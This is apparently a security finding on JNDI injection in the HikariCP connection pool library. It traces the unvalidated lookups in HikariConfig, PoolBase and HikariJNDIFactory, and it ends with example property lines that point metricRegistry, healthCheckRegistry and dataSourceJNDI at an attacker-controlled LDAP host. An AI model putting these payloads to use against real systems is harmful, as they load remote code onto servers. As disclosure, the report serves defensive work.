Title: JNDI Injection via HikariConfig property lookup or dataSourceJNDI lookup
Analysis:
In `com.zaxxer.hikari.HikariConfig`, the helper method `getObjectOrPerformJndiLookup` (lines 1190-1202) is invoked when the metricRegistry property (via `setMetricRegistry()`) or healthCheckRegistry property (via `setHealthCheckRegistry()`) is set as a string. This method instantiates an unconfigured JNDI `InitialContext` and performs a JNDI `lookup()` on the user-supplied string value. If an attacker has control over the configuration properties of `HikariConfig` (e.g. from a user-supplied property file or configuration interface), they can specify a malicious JNDI URL (such as `ldap://attacker.com/Exploit`) leading to JNDI injection and remote code execution (RCE).

Similarly, in `com.zaxxer.hikari.pool.PoolBase` during `initializeDataSource` (line 331-332), if `dataSourceJNDI` is specified, an `InitialContext` is instantiated and `lookup()` is called with `dataSourceJNDI`. Additionally, in `com.zaxxer.hikari.HikariJNDIFactory` (lines 56-86), `lookupJndiDataSource` queries the `dataSourceJNDI` JNDI name.

These functions lack any input validation or sanitization, allowing arbitrary JNDI lookup strings to be evaluated.

**Conceptual Exploit Payload:**
In a configuration file (or properties parameter) passed to `HikariConfig`:
```properties
metricRegistry=ldap://attacker_control_server/object
# or
healthCheckRegistry=ldap://attacker_control_server/object
# or
dataSourceJNDI=ldap://attacker_control_server/object
```
This forces JNDI to connect to `attacker_control_server` and fetch/load a malicious remote object, triggering remote code execution.
